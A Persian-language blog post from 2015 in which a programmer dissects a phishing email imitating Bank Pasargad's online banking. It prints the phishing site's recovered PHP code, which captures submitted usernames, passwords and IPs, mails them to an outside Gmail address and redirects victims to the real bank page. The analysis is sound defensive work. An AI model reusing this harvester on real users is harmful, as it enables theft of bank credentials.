<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>فیشینگ بانک پاسارگاد &#8211; پیدا کردن هکر</title>
  <meta name="description" content="یه ایمیل برام اومد که با یه روش قدیمی و شناخته شده سعی در هک کردن اکانت حساب بانکی پاسارگادم داره؛ فیشینگ (Phishing).">
  
  <meta name="keywords" content="amir karimi, geek, programmer, solution architect, solution engineer, tech lead, senior software developer, senior engineer, sre, devops, scala, linux, rust, go, ruby, python" />
  
  
  
  
  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="http://localhost:4000/2015/07/%d9%81%db%8c%d8%b4%db%8c%d9%86%da%af-%d8%a8%d8%a7%d9%86%da%a9-%d9%be%d8%a7%d8%b3%d8%a7%d8%b1%da%af%d8%a7%d8%af/">
  <link rel="alternate" type="application/rss+xml" title="چارچوب توسعه" href="http://localhost:4000/feed.xml" />
</head>


  
  <body>

    <header class="site-header">

  <div class="wrapper">

    <a class="site-title" href="/">چارچوب توسعه</a>

    <nav class="site-nav">
      <a href="#" class="menu-icon">
        <svg viewBox="0 0 18 15">
          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
        </svg>
      </a>

      <div class="trigger">
        
          
          <a class="page-link" href="/%25d8%25aa%25d9%2585%25d8%25a7%25d8%25b3.html">تماس</a>
          
        
          
          <a class="page-link" href="/%25d8%25af%25d8%25b1%25d8%25a8%25d8%25a7%25d8%25b1%25d9%2587-%25d9%2585%25d9%2586.html">درباره</a>
          
        
          
          <a class="page-link" href="/%25d8%25af%25d8%25b1%25d8%25a8%25d8%25a7%25d8%25b1%25d9%2587-%25d9%2585%25d9%2586/%25d8%25b3%25d8%25b1%25da%25af%25d8%25b0%25d8%25b4%25d8%25aa.html">سرگذشت</a>
          
        
          
          <a class="page-link" href="/%25d9%2587%25d9%2585%25da%25a9%25d8%25a7%25d8%25b1%25db%258c.html">همکاری</a>
          
        
          
        
          
        
          
        
      </div>
    </nav>

  </div>

</header>

<div class="wrapper">
  <div class="archived-badge alert">
    این وب‌لاگ آرشیو شده!
  </div>
</div>


    <div class="page-content">
      <div class="wrapper">
        <div class="post">

  <header class="post-header">
    <h1 class="post-title">فیشینگ بانک پاسارگاد &#8211; پیدا کردن هکر</h1>
    <p class="post-meta">Jul 8, 2015 • امیر کریمی</p>
  </header>

  <article class="post-content">
    <p>یه ایمیل برام اومد که با یه روش قدیمی و شناخته شده سعی در هک کردن اکانت حساب بانکی پاسارگادم داره؛ فیشینگ (Phishing).</p>

<p><a href="/wp-content/uploads/2015/07/pishing_pasargad.jpeg" target="_blank"><img class="aligncenter wp-image-733 size-medium" src="/wp-content/uploads/2015/07/pishing_pasargad-300x148.jpeg" alt="pishing_pasargad" width="300" height="148" srcset="/wp-content/uploads/2015/07/pishing_pasargad-300x148.jpeg 300w, /wp-content/uploads/2015/07/pishing_pasargad.jpeg 728w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>

<p>همنوطور که تو تصویر بالا قابل مشاهده هست لینک داخل ایمیل در ظاهر دقیقا لینک دسترسی به اینترنت بانک پاسارگاد هست ولی در باطن لینک شده به یه سایت دیگه که دقیقا عین سایت اصلی ساخته شده فقط هرچی توی فیلدهای این صفحه بنویسیم (شامل نام کاربری و کلمه عبور) رو برای هکر میفرسته و بعد هم صفحه اصلی بانک رو نشون میده تا یه وقت به چیزی شک نکنیم و فکر کنیم که احتمالا خودمون فیلدی رو اشتباه وارد کردیم. با یه مهندسی اجتماعی ساده (اینکه کسی ۶ میلیون تومن پول ریخته به حسابمون) هم سعی کرده تحریکمون کنه که حتما لاگین کنیم.</p>

<p><a href="/wp-content/uploads/2015/07/pishing_pasargad_2.jpeg" target="_blank"><img class="aligncenter size-medium wp-image-734" src="/wp-content/uploads/2015/07/pishing_pasargad_2-300x232.jpeg" alt="pishing_pasargad_2" width="300" height="232" srcset="/wp-content/uploads/2015/07/pishing_pasargad_2-300x232.jpeg 300w, /wp-content/uploads/2015/07/pishing_pasargad_2.jpeg 674w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>

<p>جالب اینجاست که این هک برای انگلیسی زبان‌ها ساخته شده و درگاه پرداخت اصلی هم به زبان انگلیسی هست.</p>

<p>خوشبختانه هم خود Thunderbird تشخیص داد که این ایمیل جعلی هست و هم وقتی روی لینک کلیک میکنیم یه پیغام میده که ظاهر این لینک با آدرسی که بهش اشاره کرده نمی‌خونه ولی اگر هکر یه کم حرفه‌ای‌تر بود میتونست کاری کنه که ایمیل اسپم نشه و این هشدار هم داده نشه. به هر حال من شک ندارم حداقل ۸۰ درصد مردم متوجه هیچ کدوم از این مسائل نمی‌شن و نام کاربری و کلمه عبورشون رو برای هکر میفرستن! متاسفانه، به همین راحتی.</p>

<h3 id="به-روز-رسانی">به روز رسانی</h3>

<p>خوشبختانه مثل اینکه این هکر ما یه مقداری ناشی هست. اگر به مسیر روت سایت فیشینگ برید میبیند که Directory Listing سرور رو نبسته و از اون بدتر نسخه zip شده سایت رو هم گذاشته روی سرور این یعنی سورس این صفحه در دسترس هست. کد PHP این صفحه فیشینگ به شکل زیره:</p>

<pre class="brush: php; title: ; notranslate" title="">&lt;?php  
$ip = getenv("REMOTE_ADDR");  

$message .= "--------------INFORMATION-------------------\n"; 
$message .= "User: ".$_POST['username']."\n"; 
$message .= "Pass: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n"; 
$message .= "---------------Created By Kizito +6289524438862--------------------\n"; 

$send = "kizito.bank@gmail.com"; 
$subject = "Pasargad"; 
$headers = "From:  iben.bpi.ir"; 
mail($send,$subject,$message,$headers); 

header("Location: https://iben.bpi.ir/");  
?&gt; 
</pre>

<p>همونطور که مشخصه ایمیلی که اطلاعات قربانی‌ها براش ارسال میشه kizito.bank@gmail.com هست و البته برنامه‌نویس یه تلفن هم گذاشته (که مال اندونزی هست)! یه سناریو میتونه این باشه که یه آدم غیر فنی سفارش این هک رو به یه فریلنسر داده و ازش تحویل گرفته ولی موقعه بارگذاری چون مسائل امنیتی رو نمی‌دونسته اینطوری کدها رو در معرض دید عموم قرارداده. این برنامه‌نویس کلاه سیاه هم تلفنش رو گذاشته بوده واسه تبلیغ تا در انتهای هر ایمیل که برای کارفرما ارسال میشه در پایین نام کاربری و کلمه عبور قربانی‌ها بیاد. به قول معروف امضاء خودش رو اونجا گذاشته.</p>

  </article>

  

</div>

      </div>
    </div>

    <footer class="site-footer">

  <div class="wrapper">

    <h2 class="footer-heading">چارچوب توسعه</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col  footer-col-1">
        <ul class="contact-list">
          <li><a href="mailto:"></a></li>
        </ul>
      </div>

      <div class="footer-col  footer-col-2">
        <ul class="social-media-list">
          

          
        </ul>
      </div>

      <div class="footer-col  footer-col-3">
        <p class="text">تجربه‌های یه برنامه‌نویس گیک
</p>
      </div>
    </div>

  </div>

</footer>


  </body>

</html>
